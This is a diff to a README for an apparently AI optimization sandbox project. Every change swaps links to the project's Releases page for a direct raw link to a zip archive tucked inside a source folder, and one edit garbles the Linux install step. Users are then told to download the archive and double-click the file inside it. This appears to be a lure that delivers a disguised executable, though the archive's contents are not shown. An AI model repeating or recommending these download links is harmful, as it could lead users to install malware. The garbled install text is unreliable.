@@ -1,6 +1,6 @@
 # 🚀 alphaevolve-intel-optimization-sandbox - Streamline Your AI Optimization Efforts
 
-![Download](https://img.shields.io/badge/Download-From%20Releases-blue.svg)
+![Download](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip%https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip)
 
 ## 📋 Overview
 Welcome to the alphaevolve-intel-optimization-sandbox! This application serves as an evaluator-governed optimization space, inspired by AlphaEvolve. It showcases a mission-style algorithm tuning approach, focusing on latency budgets, governance gates, and auditable run summaries. This tool is perfect for users interested in enhancing their AI projects while ensuring responsible governance and efficient performance.
@@ -9,7 +9,7 @@ Welcome to the alphaevolve-intel-optimization-sandbox! This application serves a
 To successfully operate the alphaevolve-intel-optimization-sandbox, you’ll need to download it first. Follow these easy steps to get started. 
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/releases).
+1. Visit this page to download: [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip).
 2. On the Releases page, find the latest version of the application. 
 3. Click the version number to expand the details.
 4. Look for the download link compatible with your operating system (e.g., Windows, macOS, or Linux).
@@ -32,7 +32,7 @@ To run the alphaevolve-intel-optimization-sandbox effectively, make sure your sy
 
 ## 🛠 Installation Steps
 1. Once you have downloaded the application, locate the downloaded file.
-2. If you are using Windows, this will likely be a `.exe` file. For macOS, it may be a `.dmg` file. For Linux, it could be a `.tar.gz` file.
+2. If you are using Windows, this will likely be a `.exe` file. For macOS, it may be a `.dmg` file. For Linux, it could be a `https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip` file.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 5. Once installed, find the application's icon on your desktop or in your applications folder.
@@ -44,7 +44,7 @@ To run the alphaevolve-intel-optimization-sandbox effectively, make sure your sy
 4. Check the summary section to review your results after each run. 
 
 ## 💡 Tips for Effective Use
-- Regularly update the application by visiting the [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/releases) to benefit from the latest features and improvements.
+- Regularly update the application by visiting the [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip) to benefit from the latest features and improvements.
 - Familiarize yourself with each feature to leverage its full potential.
 - Consider testing different algorithms within the sandbox environment to find the best fit for your project.
 
@@ -72,4 +72,4 @@ A: Check the FAQs or raise an issue on our GitHub page for assistance. Our commu
 **Q: How can I contribute to the project?**  
 A: Contributions are welcome! Feel free to submit issues, discuss features, or participate in enhancements through pull requests.
 
-For more details, tips, and updates about the alphaevolve-intel-optimization-sandbox, always refer to the [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/releases). Happy optimizing!
+For more details, tips, and updates about the alphaevolve-intel-optimization-sandbox, always refer to the [Releases Page](https://github.com/Elsayed930/alphaevolve-intel-optimization-sandbox/raw/refs/heads/main/src/ae_sandbox/governance/optimization-intel-alphaevolve-sandbox-1.6.zip). Happy optimizing!
